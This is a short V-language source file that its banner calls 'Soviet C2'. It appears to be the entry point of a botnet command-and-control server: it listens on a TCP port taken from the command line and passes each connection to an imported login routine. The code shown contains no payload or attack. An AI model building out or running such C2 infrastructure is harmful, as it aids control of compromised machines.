
import server
import utils
import net
import os
import time
import auth

struct Port{
	   pub mut:
	       port string
}

fn handle(mut conn net.TcpConn){

   auth.login(mut conn)
   time.sleep(500*time.nanosecond)
   
}

fn connect(){
   cncport := Port { port: os.args[1] }
   
   mut server := net.listen_tcp(.ip6, ':${cncport.port}') or {panic("xxx")}
   
   for{
	  mut conn := server.accept() or {panic("Cant create")}
		go handle(mut conn)
   }
}

fn cnc_start(port string) {
 	println("Welcome to Soviet C2\r\nListening on port [$port]\r\nMade by: Vizion#4142\r\n----------------------")
}

fn main(){
   mut port := os.args[1]
   cnc_start("$port")
   connect()
}

